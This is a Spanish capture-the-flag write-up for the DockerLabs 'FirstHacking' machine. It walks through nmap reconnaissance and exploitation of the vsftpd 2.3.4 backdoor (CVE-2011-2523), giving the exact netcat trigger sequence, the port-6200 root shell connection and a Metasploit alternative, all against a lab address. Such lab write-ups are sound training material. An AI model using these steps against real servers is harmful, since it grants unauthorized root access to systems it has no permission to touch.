# 🐧 FirstHacking - DockerLabs

![Dificultad](https://img.shields.io/badge/Dificultad-Muy%20F%C3%A1cil-green)
![SO](https://img.shields.io/badge/SO-Linux-blue)
![Técnicas](https://img.shields.io/badge/T%C3%A9cnicas-vsftpd%202.3.4%20Backdoor-red)

## 📌 Resumen

Máquina de nivel **Muy Fácil** de [DockerLabs](https://dockerlabs.es/) que explota
la **puerta trasera de vsftpd 2.3.4** (**CVE-2011-2523**) para obtener acceso
directo como **root** a través del puerto **6200/tcp**.

| Fase | Técnica | Resultado |
|------|---------|-----------|
| Reconocimiento | `nmap -p-` | Solo 21/tcp (FTP) |
| Fingerprinting | `nmap -sCV` | **vsftpd 2.3.4** |
| Análisis | CVE-2011-2523 | Backdoor conocido |
| Explotación | `nc` + `USER user:)` | Shell en 6200/tcp |
| Root | `nc 172.17.0.2 6200` | **root** ✅ |

> **Nota:** Esta máquina no incluye archivo de flag. El objetivo es demostrar
> acceso como `root`, evidenciado con `whoami`.

---

## 🔍 Reconocimiento

### Escaneo de puertos

```bash
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oN allPorts
```

**Resultado:**

| Puerto | Servicio |
|--------|----------|
| 21     | FTP      |

Solo el puerto 21 está abierto.

### Fingerprinting

```bash
nmap -sCV -p21 172.17.0.2 -oN targeted
```

**Resultado:**

```
21/tcp open  ftp     vsftpd 2.3.4
```

✅ **Versión vulnerable confirmada.**

---

## 🧠 Análisis: CVE-2011-2523

En 2011, el código fuente de **vsftpd 2.3.4** fue comprometido y se introdujo
una **puerta trasera**. Cuando un cliente envía un **usuario que termina en
`:)`**, el servidor:

1. Abre una **shell en el puerto 6200/tcp**.
2. La deja escuchando para que cualquiera se conecte.

**Referencia:** [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)

---

## 💥 Explotación

### 1. Activar el backdoor (Terminal 1)

```bash
nc 172.17.0.2 21
```

Enviar:

```
USER user:)
PASS x
```

⚠️ **Importante:** el backdoor de FirstHacking es **frágil**. Se cierra rápido
si no te conectas al puerto 6200 **inmediatamente**.

### 2. Conectar a la shell (Terminal 2)

```bash
nc 172.17.0.2 6200
```

Comprobar:

```bash
whoami
# root
```

### Alternativa: Metasploit

Si `nc` no funciona, se puede usar Metasploit:

```bash
msfconsole -q
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 172.17.0.2
run
```

---

## 📸 Evidencia

<img width="441" height="181" alt="image" src="https://github.com/user-attachments/assets/9b707052-d073-4b1b-9fac-7c7e85f42c34" />


✅ **Máquina comprometida completamente.**

---

## 🏁 Flags

Esta máquina **no incluye archivo de flag**. La evidencia es:

```bash
whoami
# root
```

> En `/root/` hay una carpeta `vsftpd-2.3.4` con el código fuente del servicio,
> que forma parte del montaje del lab.

---

## 🧠 Lecciones aprendidas

1. **Identificar la versión exacta** de un servicio es clave. `vsftpd 2.3.4`
   tiene un exploit famoso de 2011.
2. **CVE-2011-2523** es un backdoor introducido en el código fuente, no un
   bug de programación. Demuestra que la **cadena de suministro** es un vector real.
3. **El backdoor es frágil**: hay que conectarse al puerto 6200 **inmediatamente**
   después de activarlo. Si esperas, se cierra.
4. **Dos terminales en paralelo** es la técnica estándar para este exploit.
5. **Alternativas a `nc`**: Metasploit o scripts de Python (searchsploit) si
   el manual falla.

---

## 🛠️ Herramientas utilizadas

- `nmap`
- `nc` (netcat)
- Metasploit (alternativa)

---

## 📚 Referencias

- [DockerLabs](https://dockerlabs.es/)
- [CVE-2011-2523 - NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
- [vsftpd 2.3.4 Backdoor - Rapid7](https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/)

---

**Autor:** [Murmur](https://github.com/murmur403)
**Fecha:** 2026-10-06
